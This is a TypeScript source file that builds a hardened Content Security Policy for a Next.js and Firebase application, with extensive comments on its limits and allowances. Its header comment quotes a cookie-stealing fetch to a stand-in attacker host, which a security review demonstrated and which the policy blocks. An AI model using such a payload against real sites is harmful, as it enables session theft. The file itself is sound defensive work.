/**
 * The Content Security Policy, and an honest account of what it can enforce.
 *
 * ── Why this exists ──
 * A review of the documentation renderer found markdown-authored HTML reaching
 * `dangerouslySetInnerHTML` on a prerendered page. The renderer was fixed at
 * source, but the incident's second finding was that nothing stood behind it:
 * the application shipped no CSP at all, so an injected `<script>` had the run
 * of the origin the dashboard is served from. This is the layer that was
 * missing.
 *
 * ── What it cannot do, and why ──
 * It cannot stop an injected inline `<script>` from executing. That is a
 * property of the stack rather than a preference:
 *
 *  - The App Router streams its RSC payload as an inline
 *    `self.__next_f.push([1,"…"])` script. It is per-page — about 28 KB on the
 *    home page — so there is no hash to pin, and hydration does not happen
 *    without it.
 *  - The alternative is a per-request nonce, which Next can only apply when
 *    Proxy sets it on the request. ADR 0008 records why this deployment has no
 *    Proxy and cannot have one: Next 16 defaults it to the Node runtime and
 *    forbids the `runtime` option there, and `@opennextjs/cloudflare` exits 1
 *    rather than build a Node middleware. There is no configuration satisfying
 *    both.
 *  - Nonces would also force every page dynamic, which would take the
 *    documentation and marketing pages off prerendering.
 *
 * Because a hash or nonce in `script-src` makes browsers *ignore*
 * `'unsafe-inline'`, this is not a spectrum to slide along: either the flight
 * payload is allowed inline or the application does not hydrate.
 *
 * ── What it does do, which is most of the damage ──
 * Injected script still executes; what it can accomplish is what changes. The
 * payload the review actually demonstrated was
 * `fetch("https://evil.example?c=" + document.cookie)`, and `connect-src 'self'`
 * refuses it. So does the `<img>` beacon, under `img-src`. Loading a second
 * stage from an attacker's origin is refused by `script-src`, which names this
 * origin, Google's script loader and the two reCAPTCHA paths the Firebase SDK
 * reaches for, and nothing else; posting the page's data to one
 * is refused by `form-action 'self'`, rewriting every relative URL on the page
 * by `base-uri 'self'`, and the plugin-based vectors by `object-src 'none'`. An
 * injection becomes noisy and local instead of a foothold.
 *
 * Read `experimental.sri` in `next.config.ts` for the one hardening deliberately
 * not taken.
 */

/**
 * Google's identity endpoints, which the Firebase Auth SDK calls from the
 * browser.
 *
 * Named here rather than discovered, because a policy that is assembled from
 * whatever the SDK happened to request is a policy nobody can review. These two
 * are the documented hosts for the email/password and ID-token refresh flows —
 * `identitytoolkit` signs in and `securetoken` exchanges refresh tokens — and
 * this application uses no other Google service from the client.
 */
const GOOGLE_IDENTITY_HOSTS = [
  'https://identitytoolkit.googleapis.com',
  'https://securetoken.googleapis.com',
] as const;

/**
 * Google's script loader, which the sign-in popup does not open without.
 *
 * `signInWithPopup` does not go straight to `window.open`. It initialises the
 * resolver first — `browserPopupRedirectResolver`, wired up explicitly in
 * `lib/firebase.ts` — and that resolver initialises by injecting a `<script>`
 * for `https://apis.google.com/js/api.js`, the URL the SDK registers as its
 * `gapiScript`. Only once gapi has loaded does it embed the hidden
 * `https://{authDomain}/__/auth/handler` iframe that carries the answer back.
 *
 * A `script-src` omitting this host does not degrade the flow, it ends it: the
 * loader is refused, `_loadGapi` rejects, and every Google sign-in fails with
 * `auth/network-request-failed` — a message that sends the reader looking for a
 * network outage rather than for a header. The first version of this file
 * omitted it, and a test asserting that `script-src` named no remote host at
 * all stood over the omission looking like a security property.
 *
 * One host covers the whole of it: the loader fetches its own modules from
 * `https://apis.google.com/_/scs/…`, the same origin. It is left unscoped by
 * path for that reason — `/js/` would allow the entry point and refuse
 * everything it then pulls in.
 *
 * Named unconditionally, like the identity hosts above and for the same reason:
 * it is Google's host rather than the project's, so it does not vary with a
 * self-hoster's configuration, and a policy whose shape changes with the
 * environment is one nobody can review by reading it.
 */
const GOOGLE_SCRIPT_HOST = 'https://apis.google.com';

/**
 * reCAPTCHA Enterprise, which the email/password flows load without anyone here
 * asking them to.
 *
 * This file used to state that the reCAPTCHA scripts the SDK registers were
 * deliberately absent because "only `RecaptchaVerifier` and phone auth load
 * those, and this application uses neither". That was false, and false in the
 * direction that ends sign-in. Read in the installed `@firebase/auth@1.13.4`
 * (`dist/esm/index-DGK4UgBf.js`): `signInWithEmailAndPassword`,
 * `createUserWithEmailAndPassword` and `sendPasswordResetEmail` each call
 * `handleRecaptchaFlow(…, EMAIL_PASSWORD_PROVIDER)`. No `RecaptchaVerifier` is
 * ever constructed by this application; the SDK constructs one itself.
 *
 * What arms it is a toggle in the Firebase console — reCAPTCHA enforcement for
 * the email/password provider — which changes nothing in this repository. This
 * application never calls `initializeRecaptchaConfig`, so the SDK takes the
 * unarmed branch: it makes the call, the identity API answers
 * `auth/missing-recaptcha-token`, and `handleRecaptchaFlow` responds to that by
 * injecting `https://www.google.com/recaptcha/enterprise.js?render=<siteKey>`
 * and retrying. Refused by `script-src`, the injected `<script>` fires `onerror`,
 * which the SDK turns into a rejected promise; `injectRecaptchaFields` catches
 * the first `verify()` and retries it with `forceRefresh`, and *that* one is not
 * caught. So the rejection surfaces from all three entry points at once —
 * sign-in, sign-up and password reset dead together, reported as the generic
 * "Sign-in failed. Please try again.", for a header nobody touched.
 *
 * Two sources because the loader is not the library. `enterprise.js` is 1.6 KB
 * whose whole job is to inject a second `<script>` for
 * `https://www.gstatic.com/recaptcha/releases/<build>/recaptcha__en.js`, which is
 * the implementation; fetching the first and refusing the second fails in
 * exactly the same place. Both are scoped by path rather than named as hosts: a
 * bare `https://www.google.com` in `script-src` is the textbook allowlist
 * bypass, since that origin has served JSONP-style endpoints that reflect an
 * attacker-chosen callback name back as executable script, and `/recaptcha/`
 * keeps the allowance to the directory reCAPTCHA is actually served from.
 *
 * `connect-src` is deliberately not widened for this. The token is produced
 * inside the badge frame below, which makes its own requests from its own
 * origin, and the site key comes from `identitytoolkit`, already named above.
 */
const RECAPTCHA_SCRIPT_SOURCES = [
  'https://www.google.com/recaptcha/',
  'https://www.gstatic.com/recaptcha/',
] as const;

/**
 * The frame reCAPTCHA needs in order to answer at all.
 *
 * `grecaptcha.enterprise.execute` does not compute a token in the page. It
 * embeds `https://www.google.com/recaptcha/enterprise/anchor?…` — the invisible
 * "protected by reCAPTCHA" badge, a real document with its own CSP — and talks
 * to it by `postMessage`. Refuse the frame and the failure is quieter than the
 * script one rather than louder: `execute` hangs until reCAPTCHA's own anchor
 * timeout — 20 seconds, set as `anchor-ms` by the loader — and the SDK's
 * `.catch` then resolves the literal string `NO_RECAPTCHA`, which is sent to
 * the identity API and rejected there. Three flows that stall for twenty
 * seconds and then report a generic failure is not a better outcome than three
 * that fail immediately.
 */
const RECAPTCHA_FRAME_SOURCE = 'https://www.google.com/recaptcha/';

/**
 * A hostname — and specifically not the other things a CSP source expression is
 * willing to read.
 *
 * Labels of ASCII letters, digits and inner hyphens, joined by dots. What that
 * rules out is the reason the check exists: `*` and `*.firebaseapp.com` are not
 * malformed values, they are legal CSP host sources meaning "any host" and "any
 * subdomain", and both survive a `URL` round trip untouched —
 * `new URL('https://*').origin` is the string `'https://*'`. A wildcard
 * reaching `connect-src` or `frame-src` hands an injected script exactly the
 * outbound destination the rest of this file exists to deny it, and it gets
 * there from a value an operator can plausibly type while meaning "all our
 * Firebase domains".
 *
 * It also rules out a port, a userinfo section, an IP literal and an
 * internationalised name. None of those is an `authDomain`: the value names the
 * one host serving `/__/auth/handler` over 443, and an IDN reaches DNS — and so
 * this policy — already punycoded. Refusing them costs a deployment that has
 * never existed and buys a check that can be read in one line.
 */
const HOSTNAME = /^[a-z0-9](?:[a-z0-9-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)*$/i;

/**
 * The same check, exported so `parseFirebaseConfig` can apply it.
 *
 * `lib/firebase.ts` is where an operator's `authDomain` gets the error message
 * that names the field, and this module is where the same value silently
 * decides whether `frame-src` has an entry. Two independent notions of "is that
 * a hostname" is how the two drift, and the drift only shows up as a
 * deployment whose configuration checks pass and whose sign-in does not work.
 * One regex, one meaning, imported rather than retyped.
 */
export function isHostname(value: string): boolean {
  return HOSTNAME.test(value);
}

/**
 * The project's own Firebase domain, read from the config the client already
 * gets.
 *
 * `signInWithPopup` opens `https://{authDomain}/__/auth/handler` and the SDK
 * keeps a hidden iframe on the same host to hear the answer, so the domain has
 * to appear in `frame-src` and `connect-src`. Deriving it from
 * `NEXT_PUBLIC_FIREBASE_CONFIG` rather than hard-coding it is what keeps a
 * self-hoster's own Firebase project working — the alternative is a policy that
 * silently only permits sign-in to this project's deployment.
 *
 * Config that is absent, unparseable, or carrying an `authDomain` that is not a
 * hostname yields nothing, and the policy is simply built without those
 * entries: a deployment with no Firebase configured has no sign-in to break,
 * and a malformed value is reported by `check:env` and by the sign-in page's
 * setup notice with a far better message than a CSP failure would give —
 * `parseFirebaseConfig` applies `isHostname` above to the same field, which is
 * what makes that sentence true rather than hopeful. Failing closed is the
 * point — the alternative is a directive that permits more than the operator
 * meant, which is the one failure mode a policy must not have.
 *
 * This function is the more forgiving of the two: it strips a leading scheme
 * before checking, where `parseFirebaseConfig` refuses one outright. That is
 * not a disagreement about what an `authDomain` is. A value carrying a scheme
 * is broken for the SDK — it interpolates the string raw into
 * `https://${authDomain}/__/auth/iframe` — so the operator has to be told, and
 * telling them is that function's job; there is nothing for this one to gain by
 * *also* dropping the `frame-src` entry it could still work out correctly.
 */
export function firebaseAuthOrigin(rawConfig: string | undefined): string | null {
  if (!rawConfig) return null;

  try {
    const parsed: unknown = JSON.parse(rawConfig);
    if (typeof parsed !== 'object' || parsed === null) return null;

    const authDomain = (parsed as Record<string, unknown>)['authDomain'];
    if (typeof authDomain !== 'string' || authDomain === '') return null;

    // A pasted value often still carries its scheme, which is the obvious
    // mistake and worth absorbing rather than refusing. Case-insensitively:
    // `HTTPS://P.FIREBASEAPP.COM` is what a shell or a spreadsheet that
    // upper-cases things hands over, and a case-sensitive strip left the scheme
    // on the front to be read as the hostname — producing the origin
    // `https://https`, which is a perfectly well-formed source expression
    // naming a host that does not exist.
    const host = authDomain.replace(/^https?:\/\//i, '');
    if (!HOSTNAME.test(host)) return null;

    // Lower-cased because DNS does not care and a header is read by people:
    // `https://P.FIREBASEAPP.COM` sitting in `frame-src` invites the question
    // of whether it matches anything, which is a question nobody should have to
    // answer while reading a policy.
    return `https://${host.toLowerCase()}`;
  } catch {
    return null;
  }
}

export interface CspOptions {
  /** `next dev` needs allowances a deployment must never be given. */
  isDevelopment: boolean;
  /** Usually `process.env.NEXT_PUBLIC_FIREBASE_CONFIG`. */
  firebaseConfig: string | undefined;
}

export function contentSecurityPolicy({ isDevelopment, firebaseConfig }: CspOptions): string {
  const firebase = firebaseAuthOrigin(firebaseConfig);
  const identity = [...GOOGLE_IDENTITY_HOSTS, ...(firebase === null ? [] : [firebase])];

  const directives: Record<string, readonly string[]> = {
    // Everything not named below falls here, so a directive nobody thought
    // about fails closed rather than being unrestricted.
    'default-src': ["'self'"],

    // `'unsafe-inline'` is the RSC flight payload — see the header. It is not
    // reachable by an attacker who cannot already inject into the document, and
    // an attacker who can is constrained by every other directive here.
    //
    // The Google sources are the sign-in popup's script loader and the
    // reCAPTCHA pair the email/password flows load when an operator turns
    // enforcement on. They are the only remote code this application executes,
    // and both blocks above say what breaks without them.
    //
    // In development React reconstructs server stacks with `eval`, which is
    // exactly the capability a deployment must not hand out.
    'script-src': [
      "'self'",
      "'unsafe-inline'",
      GOOGLE_SCRIPT_HOST,
      ...RECAPTCHA_SCRIPT_SOURCES,
      ...(isDevelopment ? ["'unsafe-eval'"] : []),
    ],

    // Inline styles are a different risk from inline scripts: they cannot call
    // anything, and the exfiltration tricks built on CSS selectors need a
    // request to an attacker's origin, which `img-src` and `connect-src` refuse.
    // Next injects its own `<style>` blocks and Tailwind's layer ordering rides
    // on them, so this is not optional either.
    'style-src': ["'self'", "'unsafe-inline'"],

    // `data:` for the generated brand mark and the QR-shaped inline assets;
    // `blob:` for anything the client composes before showing it. No remote
    // origin: an `<img>` to somewhere else is a beacon whether or not it draws.
    'img-src': ["'self'", 'data:', 'blob:'],

    // `next/font` downloads Geist at build time and serves it from this origin,
    // so there is no font host to allow.
    'font-src': ["'self'"],

    // The one directive that turns a script injection from a breach into a
    // nuisance: with nowhere to send it, stolen data stays on the page.
    'connect-src': ["'self'", ...identity],

    // The Firebase popup helper and reCAPTCHA's badge frame, path-scoped.
    // Everything else that could host a frame is refused, and `frame-ancestors`
    // below refuses the reverse.
    'frame-src': ["'self'", ...(firebase === null ? [] : [firebase]), RECAPTCHA_FRAME_SOURCE],

    'object-src': ["'none'"],
    'base-uri': ["'self'"],
    'form-action': ["'self'"],

    // The modern half of `X-Frame-Options: DENY`, which is also set. Both, not
    // either: the header is what older browsers read, this is what current ones
    // read, and clickjacking a secret manager is worth two lines.
    'frame-ancestors': ["'none'"],

    'worker-src': ["'self'", 'blob:'],
    'manifest-src': ["'self'"],
  };

  const rendered = Object.entries(directives).map(
    ([name, sources]) => `${name} ${sources.join(' ')}`,
  );

  // Not in development, where the dev server is plain http on localhost and
  // this would make every asset request unservable.
  if (!isDevelopment) rendered.push('upgrade-insecure-requests');

  return rendered.join('; ');
}
